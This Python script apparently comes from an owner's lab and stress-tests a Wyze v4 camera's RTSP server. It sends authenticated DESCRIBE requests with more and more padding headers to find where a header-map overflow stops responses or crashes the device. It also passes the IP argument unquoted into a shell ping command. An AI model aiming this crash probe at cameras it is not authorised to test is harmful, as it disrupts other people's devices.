#!/usr/bin/env python3
"""Header-map stress for the Wyze v4 RTSP server (owner lab).

Sends a DESCRIBE with N extra headers and reports what comes back. The runbook
notes a header-map overflow with no response; this measures where the response
stops and whether the camera survives.

usage: rtsp_header_press.py <ip> <user> <pass> [n_start] [n_step] [n_max]
"""
import base64
import hashlib
import os
import socket
import sys
import time
import urllib.request


def digest_auth(user, pwd, realm, nonce, uri, method):
    ha1 = hashlib.md5(f"{user}:{realm}:{pwd}".encode()).hexdigest()
    ha2 = hashlib.md5(f"{method}:{uri}".encode()).hexdigest()
    return hashlib.md5(f"{ha1}:{nonce}:{ha2}".encode()).hexdigest()


def one(ip, user, pwd, n, timeout=4.0):
    s = socket.create_connection((ip, 554), timeout=timeout)
    s.settimeout(timeout)
    uri = f"rtsp://{ip}/stream0"
    req = f"DESCRIBE {uri} RTSP/1.0\r\nCSeq: 1\r\n"
    if user:
        # ask for the challenge first, then answer it
        s.sendall(req.encode() + b"\r\n")
        first = s.recv(2048).decode("utf-8", "replace")
        nonce = ""
        realm = ""
        for line in first.split("\r\n"):
            low = line.lower()
            if low.startswith("www-authenticate:"):
                for part in line.split(","):
                    part = part.strip()
                    if part.lower().startswith("nonce="):
                        nonce = part.split("=", 1)[1].strip('"')
                    if part.lower().startswith("realm="):
                        realm = part.split("=", 1)[1].strip('"')
        if nonce:
            resp = digest_auth(user, pwd, realm, nonce, uri, "DESCRIBE")
            req = (
                f"DESCRIBE {uri} RTSP/1.0\r\nCSeq: 2\r\n"
                f'Authorization: Digest username="{user}", realm="{realm}", '
                f'nonce="{nonce}", uri="{uri}", response="{resp}"\r\n'
            )
        else:
            req += "\r\n"
    extra = "".join(f"X-{i}: {'A' * 8}\r\n" for i in range(n))
    s.sendall((req + extra + "\r\n").encode())
    try:
        data = s.recv(4096)
    except socket.timeout:
        data = b"<timeout>"
    s.close()
    return data[:64].decode("utf-8", "replace").replace("\r\n", "|")


def alive(ip):
    return os.system(f"ping -c1 -W 500 {ip} >/dev/null 2>&1") == 0


def main():
    ip, user, pwd = sys.argv[1], sys.argv[2], sys.argv[3]
    start = int(sys.argv[4]) if len(sys.argv) > 4 else 8
    step = int(sys.argv[5]) if len(sys.argv) > 5 else 8
    limit = int(sys.argv[6]) if len(sys.argv) > 6 else 160
    n = start
    while n <= limit:
        if not alive(ip):
            print(f"n={n:<4} camera down before send; waiting")
            for _ in range(20):
                time.sleep(2)
                if alive(ip):
                    break
            time.sleep(3)
        try:
            head = one(ip, user, pwd, n)
        except Exception as exc:  # noqa: BLE001
            head = f"<{type(exc).__name__}: {exc}>"
        time.sleep(1)
        up = alive(ip)
        print(f"n={n:<4} up={int(up)} -> {head}")
        if not up:
            time.sleep(8)
        n += step


if __name__ == "__main__":
    main()
